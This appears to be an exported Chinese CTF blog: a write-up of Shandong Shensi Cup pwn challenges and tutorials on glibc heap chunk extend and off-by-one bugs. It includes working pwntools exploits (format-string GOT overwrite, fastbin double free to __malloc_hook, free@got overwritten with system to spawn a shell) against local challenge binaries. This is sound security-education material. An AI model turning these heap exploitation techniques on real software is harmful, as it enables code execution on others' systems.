[{"title":"山东深思杯write up","url":"/2019/11/03/山东深思杯write-up/","content":"# pwn\n\n## pwn1\n\n题目给了一个backdoor ，满足约束条件即可\n\n```python\nfrom pwn import *\ncontext.log_level='debug'\np = process(\"./pwn_MinZhu\")\n#p =remote(\"172.29.1.38\", 9999)\nelf = ELF(\"./pwn_MinZhu\")\nsystem = 0x08048696\nplt = elf.got['puts']\n\np.sendlineafter(\"Key:\",\"xNd9y6\")\noffset = 4\n\np.recvuntil(\"your msg:\")\npayload=fmtstr_payload(4,{0x804A064:0x3})\np.sendline(payload)\n\npayload = fmtstr_payload(4,{0x804A060:8217})\np.sendline(payload)\npayload = fmtstr_payload(4,{plt:0x8048696})\n\np.sendline(payload)\n'''\nSHBYTE = 57 9\nSHBYTE1 = 78 N\nSHBYTE2 = 100 d\nCHAR S = 120 x\nv4 =6\nv3 = y\n\nxNd9y6\n'''\np.interactive()\n```\n\n## pwn2\n\n```python\nfrom pwn import *\ncontext.log_level='debug'\np = process(\"./pwn\")\nelf = ELF(\"./pwn\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\ndef add(size,content):\n\tp.sendlineafter(\"Your choice:\",str(1))\n\tp.sendlineafter(\"Input the length of data:\",str(size))\n\tp.recvuntil(\"Leave your message:\\n\")\n\tp.send(content)\n\ndef delete(idx):\n\tp.sendlineafter(\"Your choice:\",str(2))\n\tp.sendlineafter(\"\\nInput the index of sticky note that you want to delete:\\n\",str(idx))\n\ndef show():\n\tp.sendlineafter(\"Your choice:\",str(3))\n\ndef modify(idx,content):\n\tp.sendlineafter(\"Your choice:\",str(4))\n\tp.sendlineafter(\"at you want to modify:\\n\",str(idx))\n\tp.recvuntil(\"Enter what you want to modify:\\n\")\n\tp.send(content)\n# step 1 :unsorted bin attack to leak libc\n# allocate unsorted bin to make libc addr into chunk\nadd(0x7f,\"\\n\")\nadd(0x7f,\"\\n\")\ndelete(1)\nadd(0x7f,\"aaaaaaaa\")\nshow()\nlibc_base = u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')-libc.symbols['__malloc_hook']-0x68\n# double free and uaf\nadd(0x68,'\\n') # 4\nadd(0x68,'\\n') # 5\nadd(0x68,'\\n') # 6\ndelete(4)\nmodify(4,p64(libc_base+0x3c4aed))\nadd(0x68,'\\n') # 7\nadd(0x68,0x13*'a'+p64(libc_base+0xf1147)) # 7\np.sendline('1')\np.recvuntil('\\nInput the length of data:\\n')\np.sendline('32')\np.interactive()\n```\n## pwn3\n利用 malloc_consolidate 去完成 chunk 的重叠，从而实现leak libc跟 tcache 的uaf（通过刻意的让 unsorted chunk 的size变小，可以让 unsorted chunk 的下一个chunk的prev_size 不变，从而可以 pass malloc_consolidate 时的 unlink 检测，从而实现chunk的重\n","tags":["write up"],"categories":["CTF"]},{"title":"chunk extend","url":"/2019/10/21/chunk-extend/","content":"\n## 介绍\n\nchunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件\n\n* 程序中存在基于堆的漏洞\n* 漏洞可以控制 chunk header 中的数据\n\n\n\n## 原理\n\nchunk extend 技术能够产生的原因在于 ptmalloc 在堆 chunk 进行操作时使用的各种宏。\n\n在 ptmalloc 中，获取 chunk 块大小操作如下\n\n~~~cpp\n/* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n#define chunksize_nomask(p) ((p)->mchunk_size)\n~~~\n\n一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。\n\n在 ptmalloc 中，获取下一 chunk 块地址的操作如下\n\n~~~cpp\n/* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n~~~\n\n即使用当前块指针加上当前块大小。\n\n在 ptmalloc 中，获取前一个chunk 信息的操作如下\n\n~~~cpp\n/* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n#define prev_size(p) ((p)->mchunk_prev_size)\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n~~~\n\n即通过 malloc_chunk->prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。\n\n在 ptmalloc，判断当前 chunk 是否 use 状态的操作如下：\n\n~~~cpp\n#define inuse(p)\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)\n~~~\n\n即查看下一个 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前chunk size 计算得出\n\n通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 prev_size 域来实现跨越块操作从而导致 overlapping的。\n\n与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。\n\n## 基本示例1：对 inuse 的fastbin 进行extend\n\n简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。**注意，我们的示例都是在 64 位的程序。如果想在32位下进行测试，可以把 8 字节偏移改为 4 字节。**\n\n~~~cpp\nint main(void)\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//分配第一个0x10的chunk\n    malloc(0x10);//分配第二个0x10的chunk\n\n    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域\n\n    free(ptr);\n    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容\n    return 0;\n}\n~~~\n\n当两个 malloc 语句执行之后，堆的内存分布如下\n\n~~~cpp\n0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk 2\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1 <=== top chunk\n~~~\n\n之后，我们会把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40.在题目中这一步可以由堆溢出得到。\n\n~~~cpp\n0x602000:   0x0000000000000000  0x0000000000000041 <=== 篡改大小\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1\n~~~\n\n执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。\n\n~~~assembly\nFastbins[idx=0, size=0x10] 0x00\nFastbins[idx=1, size=0x20] 0x00\nFastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE)\nFastbins[idx=3, size=0x40] 0x00\nFastbins[idx=4, size=0x50] 0x00\nFastbins[idx=5, size=0x60] 0x00\nFastbins[idx=6, size=0x70] 0x00\n~~~\n\n之后我们通过 malloc(0x30) 得到 chunk1 + chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。\n\n~~~assembly\ncall   0x400450 <malloc@plt>\nmov    QWORD PTR [rbp-0x8], rax\n\nrax = 0x602010\n~~~\n\n## 基本示例2：对 inuse 的 smallbin 进行 extend\n\n通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被植入 fastbin 链表中。以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用的范围是 0x70）\n\n~~~cpp\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//分配第一个 0x80 的chunk1\n    malloc(0x10); //分配第二个 0x10 的chunk2\n    malloc(0x10); //防止与top chunk合并\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    free(ptr);\n    ptr1=malloc(0xa0);\n}\n~~~\n\n在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个chunk ，把释放的块与 top chunk 隔开。\n\n~~~assembly\n0x602000:   0x0000000000000000  0x00000000000000b1 <===chunk1 篡改size域\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021 <=== chunk2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000021 <=== 防止合并的chunk\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31 <=== top chunk\n~~~\n\n释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin\n\n~~~assembly\n0x602000:   0x0000000000000000  0x00000000000000b1 <=== 被放入unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x00000000000000b0  0x0000000000000020 <=== 注意此处标记为空\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31 <=== top chunk\n~~~\n\n~~~assembly\n[+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)\n~~~\n\n再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容\n\n~~~assembly\n     0x4005b0 <main+74>        call   0x400450 <malloc@plt>\n →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax\n\n     rax : 0x0000000000602010\n~~~\n\n## 基本示例3：对 free 的 smallbin 进行 extend\n\n示例3 是在示例2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 size 域。\n\n~~~cpp\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//分配第一个0x80的chunk1\n    malloc(0x10);//分配第二个0x10的chunk2\n\n    free(ptr);//首先进行释放，使得chunk1进入unsorted bin\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    ptr1=malloc(0xa0);\n}\n~~~\n\n两次 malloc 之后的结果如下\n\n~~~assembly\n0x602000:   0x0000000000000000  0x0000000000000091 <=== chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021 <=== chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n~~~\n\n我们首先释放 chunk1 使他进入 unsorted bin 中\n\n~~~assembly\n     unsorted_bins[0]: fw=0x602000, bk=0x602000\n →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)\n\n0x602000:   0x0000000000000000  0x0000000000000091 <=== 进入unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020 <=== chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51 <=== top chunk\n~~~\n\n然后 篡改 chunk1 的 size 域\n\n~~~cpp\n0x602000:   0x0000000000000000  0x00000000000000b1 <=== size域被篡改\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n~~~\n\n此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。\n\n## Chunk Extend/Shrink 可以做什么\n\n 一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄露和控制执行流程。\n\n此外通过 extend 可以实现 chunk overlapping ，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。\n\n\n\n## 基本示例4：通过 extend 后向 overlapping\n\n这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其他的一些利用。\n\n~~~cpp\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//分配第1个 0x80 的chunk1\n    malloc(0x10); //分配第2个 0x10 的chunk2\n    malloc(0x10); //分配第3个 0x10 的chunk3\n    malloc(0x10); //分配第4个 0x10 的chunk4    \n    *(int *)((int)ptr-0x8)=0x61;\n    free(ptr);\n    ptr1=malloc(0x50);\n}\n~~~\n\n在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。\n\n\n\n## 基本示例5：通过extend 前向 overlapping\n\n这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块。\n\n~~~cpp\nint main(void)\n{\n    void *ptr1,*ptr2,*ptr3,*ptr4;\n    ptr1=malloc(128);//smallbin1\n    ptr2=malloc(0x10);//fastbin1\n    ptr3=malloc(0x10);//fastbin2\n    ptr4=malloc(128);//smallbin2\n    malloc(0x10);//防止与top合并\n    free(ptr1);\n    *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域\n    *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域\n    free(ptr4);//unlink进行前向extend\n    malloc(0x150);//占位块\n}\n~~~\n\n前向 extend 利用了 small bin 的 unlink 机制，通过修改 pre_size 域可以跨越多个chunk 进行合并实现 overlapping。\n\n## HITCON Training lab 13\n\n程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。\n\n**程序逻辑**\n\n~~~bash\n--------------------------------\n          Heap Creator          \n--------------------------------\n 1. Create a Heap               \n 2. Edit a Heap                 \n 3. Show a Heap                 \n 4. Delete a Heap               \n 5. Exit                        \n--------------------------------\n~~~\n\n**创建堆**\n\n```cpp\nunsigned __int64 create_heap()\n{\n  _QWORD *v0; // rbx\n  signed int i; // [rsp+4h] [rbp-2Ch]\n  size_t size; // [rsp+8h] [rbp-28h]\n  char buf; // [rsp+10h] [rbp-20h]\n  unsigned __int64 v5; // [rsp+18h] [rbp-18h]\n\n  v5 = __readfsqword(0x28u);\n  for ( i = 0; i <= 9; ++i )\n  {\n    if ( !heaparray[i] )\n    {\n      heaparray[i] = malloc(0x10uLL);\n      if ( !heaparray[i] )\n      {\n        puts(\"Allocate Error\");\n        exit(1);\n      }\n      printf(\"Size of Heap : \");\n      read(0, &buf, 8uLL);\n      size = atoi(&buf);\n      v0 = heaparray[i];\n      v0[1] = malloc(size);\n      if ( !*((_QWORD *)heaparray[i] + 1) )\n      {\n        puts(\"Allocate Error\");\n        exit(2);\n      }\n      *(_QWORD *)heaparray[i] = size;\n      printf(\"Content of heap:\", &buf);\n      read_input(*((_QWORD *)heaparray[i] + 1), size);\n      puts(\"SuccessFul\");\n      return __readfsqword(0x28u) ^ v5;\n    }\n  }\n  return __readfsqword(0x28u) ^ v5;\n}\n```\n\n**编辑堆，比之前创建堆时的size多读入了一个字节，造成 off-by-one**\n\n```cpp\nunsigned __int64 edit_heap()\n{\n  int v1; // [rsp+Ch] [rbp-14h]\n  char buf; // [rsp+10h] [rbp-10h]\n  unsigned __int64 v3; // [rsp+18h] [rbp-8h]\n\n  v3 = __readfsqword(0x28u);\n  printf(\"Index :\");\n  read(0, &buf, 4uLL);\n  v1 = atoi(&buf);\n  if ( v1 < 0 || v1 > 9 )\n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if ( heaparray[v1] )\n  {\n    printf(\"Content of heap : \", &buf);\n    read_input(*((_QWORD *)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);\n    puts(\"Done !\");\n  }\n  else\n  {\n    puts(\"No such heap !\");\n  }\n  return __readfsqword(0x28u) ^ v3;\n}\n```\n\n\n\n### 基本功能\n\n程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下\n\n1. 创建堆，根据用户输入的长度，申请对应内存空间，并利用read 读取指定长度内容。这里长度没有进行检测，当长度为负数的时候，会出现任意长度堆溢出的漏洞。当前，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。\n2. 编辑堆，根据指定的索引以及之前存储的堆的大小读取内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 漏洞。\n3. 展示堆，输出指定索引堆的大小以及内容。\n4. 删除堆，删除指定堆，并且将对应指针设置为了NULL。\n\n\n\n## 利用\n\n基本利用思路如下\n\n1. 利用 off by one 漏洞覆盖下一个chunk 的size 字段，从而构造伪造的chunk 大小。\n2. 申请伪造的chunk 大小，从而产生 chunk overlap，进而修改关键指针。\n\n\n\nexp\n\n~~~python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nr = process('./heapcreator')\nheap = ELF('./heapcreator')\nlibc = ELF('./libc.so.6')\n\ndef create(size, content):\n    r.recvuntil(\":\")\n    r.sendline(\"1\")\n    r.recvuntil(\":\")\n    r.sendline(str(size))\n    r.recvuntil(\":\")\n    r.sendline(content)\n\ndef edit(idx, content):\n    r.recvuntil(\":\")\n    r.sendline(\"2\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n    r.recvuntil(\":\")\n    r.sendline(content)\n\ndef show(idx):\n    r.recvuntil(\":\")\n    r.sendline(\"3\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n\ndef delete(idx):\n    r.recvuntil(\":\")\n    r.sendline(\"4\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n\nfree_got = 0x602018\ncreate(0x18, \"dada\")  # 0\ncreate(0x10, \"ddaa\")  # 1\n# overwrite heap 1's struct's size to 0x41\nedit(0, \"/bin/sh\\x00\" + \"a\" * 0x10 + \"\\x41\")\n# trigger heap 1's struct to fastbin 0x40\n# heap 1's content to fastbin 0x20\ndelete(1)\n# new heap 1's struct will point to old heap 1's content, size 0x20\n# new heap 1's content will point to old heap 1's struct, size 0x30\n# that is to say we can overwrite new heap 1's struct\n# here we overwrite its heap content pointer to free@got\ncreate(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1\n# leak freeaddr\nshow(1)\nr.recvuntil(\"Content : \")\ndata = r.recvuntil(\"Done !\")\n\nfree_addr = u64(data.split(\"\\n\")[0].ljust(8, \"\\x00\"))\nlibc_base = free_addr - libc.symbols['free']\nlog.success('libc base addr: ' + hex(libc_base))\nsystem_addr = libc_base + libc.symbols['system']\n#gdb.attach(r)\n# overwrite free@got with system addr\nedit(1, p64(system_addr))\n# trigger system(\"/bin/sh\")\ndelete(0)\nr.interactive()\n~~~\n\n\n\n```python\nfrom pwn import *\nsh=process('./heapcreator')\nelf=ELF('./heapcreator')\nlibc=ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\ndef create(size,value):\n    sh.recvuntil('Your choice :')\n    sh.sendline('1')\n    sh.recvuntil('Size of Heap :')\n    sh.sendline(str(size))\n    sh.recvuntil('Content of heap:')\n    sh.sendline(value)\n\ndef edit(idx,value):\n    sh.recvuntil('Your choice :')\n    sh.sendline('2')\n    sh.recvuntil('Index :')\n    sh.sendline(str(idx))\n    sh.recvuntil('Content of heap : ')\n    sh.sendline(value)\n\ndef show(idx):\n    sh.recvuntil('Your choice :')\n    sh.sendline('3')\n    sh.recvuntil('Index :')\n    sh.sendline(str(idx))\n\ndef delete(idx):\n    sh.recvuntil('Your choice :')\n    sh.sendline('4')\n    sh.recvuntil('Index :')\n    sh.sendline(str(idx))\n\nfree_got=elf.got['free']\ncreate(0x18,'aaaaaaa')  #idx0 实际分配了0x10的chunk，重用idx1的prev_size的8个字节\ncreate(0x10,'aaaaaaa')　#idx1　　\ncreate(0x10,'aaaaaaa')　　#idx2\ncreate(0x10,'/bin/sh\\x00')　　#idx3\npayload='a'*0x18+'\\x81'\nedit(0,payload)   #修改idx1的size为0x81\ndelete(1)　　#idx1进入0x70的unsorted bin\nsize='\\x08'.ljust(8,'\\x00')\npayload='b'*0x40+size+p64(free_got)\ncreate(0x70,payload)　　#分配到idx1 此时size为0x70，可以堆溢出到idx2，修改idx2的内容指针为free_got\nshow(2)　　#输出free真实地址,泄露libc基地址\nsh.recvuntil('Content :')\nfree_adr=u64(sh.recvline().strip().ljust(8,'\\x00'))\n\nprint 'free_adr: '+hex(free_adr)\nlibc_base=free_adr-libc.symbols['free']\nsystem_adr=libc_base+libc.symbols['system']\nprint 'libc_base: '+hex(libc_base)\nprint 'system_adr: '+hex(system_adr)\nedit(2,p64(system_adr)) #将free_got改为system地址\ndelete(3)　　　　　　　　#free(idx->content)触发\nsh.interactive()\n```\n","tags":["pwn","heap"],"categories":["CTF"]},{"title":"Geek 10th write up","url":"/2019/10/17/Geek-10th-write-up/","tags":["write up"]},{"title":"Off-By-One学习","url":"/2019/10/10/Off-By-One学习/","content":"\n严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。\n\n## 原理\n\noff-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括\n\n* 使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。\n* 字符串操作不合适\n\n一般来说，单字节溢出被认为是难以利用，但是因为 linux 的堆管理机制 ptmalloc 验证的松散性，基于 linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss段等等。但是堆上（heap based）的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。\n\n\n\n## off-by-one 利用思路\n\n1. 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法\n2. 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得`prev_in_use`位被清，这样前块会被认为是 free 块。(1) 这时可以选择使用 unlink 方法进行处理。(2) 另外，这时`prev_size`域就会启用，就可以伪造`prev_size`，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照`prev_size`找到块的后一块（理论上是当前正在unlink的块）与当前正在 unlink 的块大小是否相等。\n\n最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check。\n\n~~~cpp\n/* consolidate backward */\n    if (!prev_inuse(p)) {\n      prevsize = prev_size (p);\n      size += prevsize;\n      p = chunk_at_offset(p, -((long) prevsize));\n      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */\n      if (__glibc_unlikely (chunksize(p) != prevsize))\n        malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n      unlink_chunk (av, p);\n    }\n~~~\n\n### 示例1\n\n~~~cpp\nint my_gets(char *ptr,int size)\n{\n    int i;\n    for(i=0;i<=size;i++)\n    {\n        ptr[i]=getchar();\n    }\n    return i;\n}\nint main()\n{\n    void *chunk1,*chunk2;\n    chunk1=malloc(16);\n    chunk2=malloc(16);\n    puts(\"Get Input:\");\n    my_gets(chunk1,16);\n    return 0;\n}\n~~~\n\n我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了依次，这也被称为栅栏错误\n\n我们使用gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为16 字节的堆块\n\n~~~assembly\n0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk2\n0x602030:   0x0000000000000000  0x0000000000000000\n~~~\n\n当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print 'A'*17\n\n~~~assembly\n0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x0000000000000041  0x0000000000000021 <=== chunk2\n0x602030:   0x0000000000000000  0x0000000000000000\n~~~\n\n### 实例2\n\n第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误\n\n~~~cpp\nint main(void)\n{\n    char buffer[40]=\"\";\n    void *chunk1;\n    chunk1=malloc(24);\n    puts(\"Get Input\");\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n}\n~~~\n\n程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。\n但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。\nstrlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 `'\\x00'` 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 `'\\x00'` 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。\n\n```assembly\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x0000000000000400\n```\n\n可以看到 next chunk 的 size 域低字节被结束符 `'\\x00'` 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。\n还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的\n\n```assembly\nDWORD 0x41424344\n内存  0x44,0x43,0x42,0x41\n```\n\n### 实例1-- Asis CTF 2016 b00ks\n\n**题目介绍**\n\n题目是一个常见的菜单式程序，功能是一个图书管理系统。\n\n```python\n1. Create a book\n2. Delete a book\n3. Edit a book\n4. Print book detail\n5. Change current author name\n6. Exit\n```\n\n题目提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示\n\n```bash\nCanary                        : No\nNX                            : Yes\nPIE                           : Yes\nFortify                       : No\nRelRO                         : Full\n```\n\n程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息\n\n```cpp\nstruct book\n{\n    int id;\n    char *name;\n    char *description;\n    int size;\n}\n```\n\n**create**\n\nbook 结构中存在 name 和 description，name 和 description 在堆上分配。首先分配 name buffer，使用malloc。大小自定但小于 32.\n\n~~~cpp\nprintf(\"\\nEnter book name size: \", *(_QWORD *)&size);\n__isoc99_scanf(\"%d\", &size);\nprintf(\"Enter book name (Max 32 chars): \", &size);\nptr = malloc(size);\n~~~\n\n之后分配 description ，同样大小自定但无限制。\n\n```cpp\nprintf(\"\\nEnter book description size: \", *(_QWORD *)&size);\n__isoc99_scanf(\"%d\", &size);\n\nv5 = malloc(size);\n```\n\n之后分配 book 结构的内存\n\n~~~cpp\nbook = malloc(0x20uLL);\nif ( book )\n{\n    *((_DWORD *)book + 6) = size;\n    *((_QWORD *)off_202010 + v2) = book;\n    *((_QWORD *)book + 2) = description;\n    *((_QWORD *)book + 1) = name;\n    *(_DWORD *)book = ++unk_202024;\n    return 0LL;\n}\n~~~\n\n**漏洞**\n\n程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。\n\n~~~cpp\nsigned __int64 __fastcall my_read(_BYTE *ptr, int number)\n{\n  int i; // [rsp+14h] [rbp-Ch]\n  _BYTE *buf; // [rsp+18h] [rbp-8h]\n\n  if ( number <= 0 )\n    return 0LL;\n  buf = ptr;\n  for ( i = 0; ; ++i )\n  {\n    if ( (unsigned int)read(0, buf, 1uLL) != 1 )\n      return 1LL;\n    if ( *buf == '\\n' )\n      break;\n    ++buf;\n    if ( i == number )\n      break;\n  }\n  *buf = 0; --》 漏洞位置\n  return 0LL;\n}\n~~~\n\n#### 利用\n\n创建两个`b00k`, 在`first b00k`中伪造`b00k`进而控制`second b00k`的`description`指针, 将该指针改为`__free_hook`, 修改`second b00k`的`description`为`execve(\"/bin/sh\")`, 最后`free`\n\n**泄露**\n\n因为程序中的 my_read 函数存在 null byte 